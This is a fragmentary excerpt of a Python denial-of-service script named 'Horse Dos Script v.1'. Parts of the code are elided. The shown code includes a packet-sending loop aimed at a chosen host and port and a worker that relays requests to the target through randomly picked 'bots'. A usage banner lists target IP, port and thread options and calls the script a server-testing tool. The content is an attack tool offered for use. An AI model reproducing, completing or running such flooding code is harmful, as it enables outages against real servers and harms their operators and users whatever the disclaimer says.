...
# python 3.3.2+ Horse Dos Script v.1
# by Hacker101-HD
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Running--> \033[0m")
			else:
				s.shutdown(1)
...
def dos2():
	while True:
		item=w.get()
		bot_Running(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Horse Dos Script v.1 http://www.canyalcin.com/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 Horse.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
